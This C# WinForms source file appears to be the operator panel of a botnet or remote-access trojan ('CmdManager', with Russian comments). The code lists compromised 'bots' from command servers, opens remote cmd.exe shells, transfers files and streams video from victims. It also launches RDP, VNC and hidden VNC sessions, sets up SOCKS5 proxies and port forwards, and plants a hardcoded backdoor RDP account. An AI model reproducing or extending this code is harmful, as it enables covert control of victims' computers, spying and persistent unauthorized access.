using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Threading;

namespace CmdManager
{
    //боты в вкладке
	public partial class FormMain : Form
	{
		public delegate void DelegateAddBots(List<Server.IdUid> bs, Server server);
		public delegate void DelegateAddLog(string s);
		List<Server> servers;
		List<Server.IdUid> bots;
		BindingSource bsBots;
		public DelegateAddBots funcAddBots;
		public DelegateAddLog funcAddLog;
		Server.IdUid currBot = null;
        public static Player.Config cfg;

		List<BotPage> botPages;

		public FormMain()
		{
			InitializeComponent();
			bots = new List<Server.IdUid>();
			servers = new List<Server>();
			foreach (Config.IpPort ip in Program.cfg.servers)
			{
				Server s = new Server(ip.ip, ip.port);
				while (true)
				{
					FormEnterPassword form = new FormEnterPassword(ip.ip, ip.port);
					if (form.ShowDialog() == System.Windows.Forms.DialogResult.OK)
					{
						if (s.SetPassword(form.Password))
						{
							servers.Add(s);
							break;
						}
						else
							MessageBox.Show("Пароль неверный", "Ошибка");
					}
					else
						break;
				}
			}
			gridBots.AutoGenerateColumns = false;
			bsBots = new BindingSource();
			bsBots.DataSource = bots;
			gridBots.DataSource = bsBots;
			funcAddBots = new DelegateAddBots(AddBots);
			funcAddLog = new DelegateAddLog(AddLog);
			botPages = new List<BotPage>();
		}

		void AddBots(List<Server.IdUid> lb, Server server)
		{
			BindingSource bs = (BindingSource)gridBots.DataSource;
			List<Server.IdUid> bots2 = bots.FindAll(bot2 => bot2.server == server); //берем боты которые принадлежат серверу от которого данные
			//добавляем и обновляем
			foreach (Server.IdUid bot in lb)
			{
				Server.IdUid b = bots2.Find(bot2 => bot2.id == bot.id);
				if (b == null)
				{
					bs.Add(bot);
				}
				else
				{
					b.Update(bot);
					bots2.Remove(b);
					if (b == currBot) SelectBot(b); //обновление содержимого выбранного бота
				}
			}
			//удаляем те что остались, они на сервере пропали
			foreach (Server.IdUid bot in bots2)
				bs.Remove(bot);
			gridBots.Refresh();
		}

		void AddLog(string s)
		{
			tbLog.Text = tbLog.Text + s + "\r\n";
			tbLog.SelectionStart = tbLog.TextLength - 1;
		}

		void UpdateBots(bool log)
		{
			foreach (Server server in servers)
			{
				ThreadGetBots getter = new ThreadGetBots(server, log);
				Thread th = new Thread(getter.Execute);
				th.Start();
			}
		}

		void SelectBot(Server.IdUid bot)
		{
			tbUID.Text = bot.uid;
			tbIP.Text = bot.ip;
			tbComment.Text = bot.comment;
			tbInfo.Text = bot.info;
			tbState.Text = bot.ports;
			currBot = bot;
		}

		BotPage GetBotPage()
		{
			if (currBot == null) return null;
			BotPage ret = botPages.Find(b => b.bot == currBot);
			if (ret == null)
			{
				ret = new BotPage();
				ret.bot = currBot;
				if (tabsOpenBots.TabPages.Count == 1 && botPages.Count == 0) //вставляем 1-ю вкладку (одна пустая вкладка уже есть, для красоты)
					ret.page = tabsOpenBots.TabPages[0];
				else
				{
					ret.page = new TabPage();
					tabsOpenBots.TabPages.Add(ret.page);
				}
				botPages.Add(ret);
				ret.page.Text = currBot.uid;
			}
			return ret;
		}

		void AddControlPage(BotPage botPage, IControlPage control, string name)
		{
			if (botPage.controls == null)
			{
				botPage.controls = new ControlBotPages();
				botPage.controls.Dock = DockStyle.Fill;
				botPage.page.Controls.Add(botPage.controls);
				botPage.controls.Start();
			}
			botPage.controls.AddPage(control, name);
			tabsOpenBots.SelectedTab = botPage.page;
		}
	
		void AddOnlineVideo()
		{
			BotPage botPage = GetBotPage();
			ControlVideo cv = new ControlVideo(botPage.bot);
			AddControlPage(botPage, cv, "Видео");
		}

		void AddCmdExe(bool user)
		{
			BotPage botPage = GetBotPage();
			ControlCmd cmd = new ControlCmd(botPage.bot, user);
			if( user )
				AddControlPage(botPage, cmd, "cmd.exe");
			else
				AddControlPage(botPage, cmd, "cmd.exe user");
		}

		void AddFileTransfer()
		{
			BotPage botPage = GetBotPage();
			ControlFileTransfer ft = new ControlFileTransfer(botPage.bot);
			AddControlPage(botPage, ft, "File Transfer");
		}

		void StopBots()
		{
			foreach (BotPage bp in botPages)
			{
				if (bp.controls !=null)
					bp.controls.Stop();
			}
		}

		void LoadGroups()
		{
			TreeNode node = new TreeNode("Все");
			node.Tag = null;
			treeGroup.Nodes.Add(node);
			if (servers.Count > 0)
			{
				List<Server.Group> groups = servers[0].CM_GetGroups();
				foreach (Server.Group g in groups)
				{
					node = new TreeNode(g.name);
					node.Tag = g;
					treeGroup.Nodes.Add(node);
				}
			}
		}

		void AddGroup(string name)
		{
			if (servers.Count == 0) return;
			int id = servers[0].CM_AddGroup(name);
			if (id > 0)
			{
				Server.Group g = new Server.Group();
				g.id = id;
				g.name = name;
				TreeNode node = new TreeNode(name);
				node.Tag = g;
				treeGroup.Nodes.Add(node);
			}
		}

		void DelGroup(string name)
		{
			Server.Group g = null;
			int n = 0;
			foreach (TreeNode node in treeGroup.Nodes)
			{
				if (node.Tag != null)
				{
					g = node.Tag as Server.Group;
					if (g.name == name) break;
				}
				n++;
			}
			if (g != null)
			{
				treeGroup.Nodes.RemoveAt(n);
				if (servers.Count == 0) return;
				servers[0].CM_DelGroup(g.id);
			}
		}

		void UpdateGroup(string name)
		{
			if (treeGroup.SelectedNode == null || treeGroup.SelectedNode.Index == 0) return;
			Server.Group g = treeGroup.SelectedNode.Tag as Server.Group;
			g.name = name;
			treeGroup.SelectedNode.Text = name;
			if (servers.Count > 0)
			{
				servers[0].CM_UpdateGroup(g.id, name);
			}
		}

		private void tabsOpenBots_DrawItem(object sender, DrawItemEventArgs e)
		{
			Brush textBrush;
			string textPage = tabsOpenBots.TabPages[e.Index].Text;
			Color textBack = tabsOpenBots.TabPages[e.Index].BackColor;
			Rectangle textRect = tabsOpenBots.GetTabRect(e.Index);
			Font font;
			if (e.State == DrawItemState.Selected)
			{
				textBrush = new SolidBrush(Color.DarkBlue);
				font = new Font(e.Font, FontStyle.Bold);
			}
			else
			{
				textBrush = new SolidBrush(e.ForeColor);
				font = e.Font;
			}
			e.Graphics.FillRectangle(new SolidBrush(textBack), e.Bounds);
			StringFormat textFormat = new StringFormat();
			textFormat.Alignment = StringAlignment.Near;
			textFormat.LineAlignment = StringAlignment.Center;
			e.Graphics.DrawString(textPage, font, textBrush, textRect, textFormat);

			Bitmap bmp = global::CmdManager.Properties.Resources.close_16;
			e.Graphics.DrawImage(bmp, textRect.X + textRect.Width - bmp.Width, (textRect.Height - bmp.Height) / 2, bmp.Width, bmp.Height);
		}

		private void tabsOpenBots_MouseDown(object sender, MouseEventArgs e)
		{
			if (tabsOpenBots.SelectedTab.Text.Length == 0) return;
			Rectangle textRect = tabsOpenBots.GetTabRect(tabsOpenBots.SelectedIndex);
			Bitmap bmp = global::CmdManager.Properties.Resources.close_16;
			Rectangle closeArea = new Rectangle(textRect.X + textRect.Width - bmp.Width, (textRect.Height - bmp.Height) / 2, bmp.Width, bmp.Height);
			if (closeArea.Contains(e.X, e.Y))
			{
				BotPage page = GetBotPage();
				if (page != null)
				{
					if(page.controls != null) page.controls.Stop();
					tabsOpenBots.TabPages.Remove(tabsOpenBots.SelectedTab);
					botPages.Remove(page);
					if (tabsOpenBots.TabPages.Count == 0) //добавляем пустую вкладку для красоты
						tabsOpenBots.TabPages.Add(string.Empty);
				}
			}
		}

		private void itemConfig_Click(object sender, EventArgs e)
		{
			FormConfig form = new FormConfig();
			form.ShowDialog();
		}

		private void FormMain_Load(object sender, EventArgs e)
		{
			UpdateBots(true);
			LoadGroups();
			timerUpdateBots.Start();
		}

		private void btRefresh_Click(object sender, EventArgs e)
		{
			UpdateBots(true);
		}

		private void gridBots_RowEnter(object sender, DataGridViewCellEventArgs e)
		{
			Server.IdUid bot = (Server.IdUid)gridBots.Rows[e.RowIndex].DataBoundItem;
			SelectBot(bot);
		}

		private void btCmdBot_Click(object sender, EventArgs e)
		{
			string cmd = tbCmdBot.Text.Trim();
			if (currBot != null) currBot.server.CM_SendCmd(currBot.id, currBot.uid, cmd);
		}

		private void btComment_Click(object sender, EventArgs e)
		{
			string s = tbComment.Text.Trim();
			if (currBot != null)
			{
				currBot.server.CM_SetComment(currBot.id, currBot.uid, s);
				currBot.comment = s;
			}
		}

		private void btOnlineVideo_Click(object sender, EventArgs e)
		{
			AddOnlineVideo();
		}

		private void FormMain_FormClosed(object sender, FormClosedEventArgs e)
		{
			StopBots();
		}

		private void btRunRDP_Click(object sender, EventArgs e)
		{
			if (currBot != null)
			{
				currBot.server.CM_RDP(currBot.id, currBot.uid);
			}
		}

		private void btRunVNC_Click(object sender, EventArgs e)
		{
			if (currBot != null)
			{
				short port;
				if (short.TryParse(tbPortVNC.Text, out port))
				{
					currBot.server.CM_VNC(currBot.id, currBot.uid, port);
				}
				else
					Output.MsgErr("Вы не указали или указали неверный порт для запуска VNC на боте");
          	}
		}

		private void btRunHVNC_Click(object sender, EventArgs e)
		{
			if (currBot != null)
			{
				short port;
				if (short.TryParse(tbPortVNC.Text, out port))
				{
					currBot.server.CM_HVNC(currBot.id, currBot.uid, port);
				}
				else
					Output.MsgErr("Вы не указали или указали неверный порт для запуска HVNC на боте");
			}
		}

		private void btPortForward_Click(object sender, EventArgs e)
		{
			System.Text.RegularExpressions.Regex regex = new System.Text.RegularExpressions.Regex(@"\b(?:\d{1,3}\.){3}\d{1,3}:\d{1,5}\b");
			string port = string.Empty;
			if (regex.IsMatch(tbPortForward.Text))
				port = tbPortForward.Text.Trim();
			else
			{
				int v;
				if( (int.TryParse(tbPortForward.Text, out v)))
				{
					port = "127.0.0.1:" + v.ToString();
				}
			}
			if (port.Length > 0)
			{
				if (currBot != null)
				{
					currBot.server.CM_PortForward(currBot.id, currBot.uid, port);
				}
			}
			else
				Output.MsgErr("Вы указали неверные данные для проброса порта");
		}

		private void btStartSocks5_Click(object sender, EventArgs e)
		{
			if (currBot != null)
			{
				currBot.server.CM_Socks5(currBot.id, currBot.uid);
			}
		}

		private void btClosePortForward_Click(object sender, EventArgs e)
		{
			if (currBot != null)
			{
				currBot.server.CM_ClosePortForward(currBot.id, currBot.uid);
			}
		}

		private void timerUpdateBots_Tick(object sender, EventArgs e)
		{
			UpdateBots(false);
		}

		private void btCmdExe_Click(object sender, EventArgs e)
		{
			AddCmdExe(false);
		}

		private void btCmdUser_Click(object sender, EventArgs e)
		{
			AddCmdExe(true);
		}
		private void btFileTransfer_Click(object sender, EventArgs e)
		{
			AddFileTransfer();
		}

		private void btRDPWrap_Click(object sender, EventArgs e)
		{
			if (currBot != null)
			{
				currBot.server.CM_RDPWrap(currBot.id, currBot.uid, "Support_7821", "Qwerty$321");
			}
		}

		private void btAddGroup_Click(object sender, EventArgs e)
		{
			if (tbNameGroup.Text.Length > 0)
			{
				AddGroup(tbNameGroup.Text.Trim());
			}
		}

		private void btDelGroup_Click(object sender, EventArgs e)
		{
			if (tbNameGroup.Text.Length > 0)
			{
				DelGroup(tbNameGroup.Text.Trim());
			}
		}

		private void btUpdateGroup_Click(object sender, EventArgs e)
		{
			if (tbNameGroup.Text.Length > 0)
			{
				UpdateGroup(tbNameGroup.Text.Trim());
			}
		}

		private void treeGroup_AfterSelect(object sender, TreeViewEventArgs e)
		{
			if (treeGroup.SelectedNode != null)
			{
				tbNameGroup.Text = treeGroup.SelectedNode.Text;
				int id = 0;
				if (treeGroup.SelectedNode.Tag != null)
				{
					Server.Group g = treeGroup.SelectedNode.Tag as Server.Group;
					id = g.id;
				}
				gridBots.CurrentCell = null;
				foreach (DataGridViewRow r in gridBots.Rows)
				{
					Server.IdUid bot = (Server.IdUid)r.DataBoundItem;
					if (bot.idGroup == id || id == 0)
						r.Visible = true;
					else
						r.Visible = false;
				}
			}
		}

		private void contextMenuBots_Opening(object sender, CancelEventArgs e)
		{
			itemToGroup.DropDownItems.Clear();
			foreach(TreeNode node in treeGroup.Nodes)
			{
				ToolStripButton item = new ToolStripButton(node.Text);
				item.Tag = node.Tag;
				item.Click += itemToGroupItem_Click;
				itemToGroup.DropDownItems.Add(item);
			}
		}

		void itemToGroupItem_Click(object sender, EventArgs e)
		{
			ToolStripButton item = sender as ToolStripButton;
			int id = 0;
			if (item.Tag != null)
			{
				Server.Group g = item.Tag as Server.Group;
				id = g.id;
			}
			if (currBot != null)
			{
				currBot.server.CM_SetBotGroup(currBot.id, currBot.uid, id);
			}
		}

		private void gridBots_CellFormatting(object sender, DataGridViewCellFormattingEventArgs e)
		{
			if(e.ColumnIndex==0)
			{
				Server.IdUid bot = (Server.IdUid)gridBots.Rows[e.RowIndex].DataBoundItem;
				e.Value = string.Empty;
				foreach (TreeNode node in treeGroup.Nodes)
				{
					if (node.Tag != null)
					{
						Server.Group g = (Server.Group)node.Tag;
						if (g.id == bot.idGroup)
						{
							e.Value = g.name;
							break;
						}
					}
				}
			}
		}

        private void fullScreenBtn_Click(object sender, EventArgs e)
        {
            FullScreenView frm = new FullScreenView();

            if (currBot == null) return ;
            frm.Init(currBot, 0);
            
            frm.Show();
        }
        private void openVNCBtn_Click(object sender, EventArgs e)
        {
            FullScreenView frm = new FullScreenView();

            if (currBot == null) return ;
            if (currBot.ports == "")
            {
                MessageBox.Show("Порт VNC не открыт!");
                return;
            }
            frm.Init(currBot, 1);
            
            frm.Show();
        }

        private void btnPlayer_Click(object sender, EventArgs e)
        {
            cfg = new Player.Config();
            cfg.Load();
            Player.FormPlayer form = new Player.FormPlayer();
            Player.FormPlayer.cfg = cfg;
            form.ShowDialog();
        }

		private void btOff_Click(object sender, EventArgs e)
		{
			if (currBot != null)
			{
				if (Output.MsgQue("Бот будет отключен. Продолжить?") == System.Windows.Forms.DialogResult.Yes)
					currBot.server.CM_Off(currBot.id, currBot.uid, 1, 0);
			}
		}

		private void btSleep_Click(object sender, EventArgs e)
		{
			if (currBot != null)
			{
				int time;
				if (int.TryParse(tbSleepMin.Text, out time))
				{
					if (Output.MsgQue("Бот заснет на " + time.ToString() + "мин. Продолжить?") == System.Windows.Forms.DialogResult.Yes)
						currBot.server.CM_Off(currBot.id, currBot.uid, 3, time * 60);
				}
				else
					Output.MsgErr("Вы не указали время спячки, или неверно его ввели");

			}
		}

	}
   	class ThreadGetBots
	{
		Server server;
		bool logPrint;

		public ThreadGetBots(Server server, bool log)
		{
			this.server = server;
			this.logPrint = log;
		}

		public void Execute()
		{
			List<Server.IdUid> bots = server.CM_GetIds();
			string log = string.Empty;
			if (bots != null)
			{
				Program.formMain.Invoke(Program.formMain.funcAddBots, new object[] { bots, server });
				log = "От сервера " + server.Name + " получено ботов: " + bots.Count.ToString();
			}
			else
				log = "Сервер " + server.Name + " не отвечает";
			if (logPrint) Program.formMain.Invoke(Program.formMain.funcAddLog, new object[] { log });
		}
	}
    public class BotPage
    {
        public Server.IdUid bot;
        public TabPage page;
        public ControlBotPages controls;
    }
}
